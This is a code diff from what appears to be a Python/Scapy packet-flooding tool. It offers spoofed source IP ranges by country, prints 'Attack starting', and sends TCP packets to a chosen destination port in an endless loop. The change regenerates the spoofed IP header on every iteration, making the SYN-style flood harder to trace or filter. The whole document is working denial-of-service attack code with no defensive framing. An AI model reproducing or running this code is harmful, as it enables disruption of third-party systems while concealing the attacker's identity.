@@ -25,39 +25,38 @@ awnser_anonymizing = anonymizing_input(supcountries)
 if awnser_anonymizing in supcountries or awnser_anonymizing == 'all':
    useriprange = chooseiprange(awnser_anonymizing, supcountries)
    Ip_range = ipRange(useriprange)
-   Ip_packet = setpacketinfoip(Ip_range,destination)
    os.system('clear')
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'
    while 0 == 0:         
          Tcp_packet = setpacketinfotcp(targetport)
-         sendpfast(Ip_packet/Tcp_packet)
+         Ip_packet = setpacketinfoip(Ip_range,destination)
+         send(Ip_packet/Tcp_packet)
    
 if awnser_anonymizing == yourIP:
    Ip_range = '192.168.0.2'
-   Ip_packet = setpacketinfoip(Ip_range,destination)
    os.system('clear')
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'
    while 0 == 0:         
          Tcp_packet = setpacketinfotcp(targetport)
-         sendpfast(Ip_packet/Tcp_packet)
+         Ip_packet = setpacketinfoip(Ip_range,destination)
+         send(Ip_packet/Tcp_packet)
         
          
 
 if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:  
     Ip_range = awnser_anonymizing
-    ipinfopacket = setpacketinfoip(Ip_range,destination)
-    Ip_packet = setpacketinfoip(Ip_range,destination)
     os.system('clear')
     print 'HaCkEr5pReMe'
     print ''
     print 'Attack starting'
     while 0 == 0:
+         Ip_packet = setpacketinfoip(Ip_range,destination)
          Tcp_packet = setpacketinfotcp(targetport)
-         sendpfast(Ip_packet/Tcp_packet)
+         send(Ip_packet/Tcp_packet)
 
 
 
